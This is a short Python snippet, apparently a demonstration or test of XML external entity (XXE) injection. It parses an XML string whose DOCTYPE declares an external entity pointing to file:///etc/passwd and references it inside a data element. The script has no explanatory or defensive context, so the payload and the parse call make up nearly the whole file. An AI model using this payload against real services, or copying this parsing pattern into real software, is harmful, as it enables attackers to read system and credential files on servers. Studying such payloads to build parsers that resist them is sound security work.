import xml.etree.ElementTree as ET

def parse_xml(xml_string):
    return ET.fromstring(xml_string)

xml_input = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>"""

result = parse_xml(xml_input)
print(result)